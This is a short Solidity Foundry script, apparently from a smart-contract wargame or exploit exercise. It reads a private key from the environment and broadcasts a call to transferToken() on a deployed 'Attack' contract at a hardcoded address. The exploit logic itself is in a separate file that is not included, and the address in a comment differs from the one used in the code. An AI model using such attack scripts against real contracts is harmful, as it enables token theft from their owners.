// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

// Attack contract address: "0x9f8379AC3429bCE93470151EBB22F06c3B81EAfa"

interface IAttack {
    function transferToken() external;
}

contract TriggerAttack is Script {
    IAttack public attack;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        vm.startBroadcast(privateKey);
        attack = IAttack(0x5731830e705Da7C8eA1953C30d4135037472BAe2);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        attack.transferToken();
        vm.stopBroadcast();
    }
}
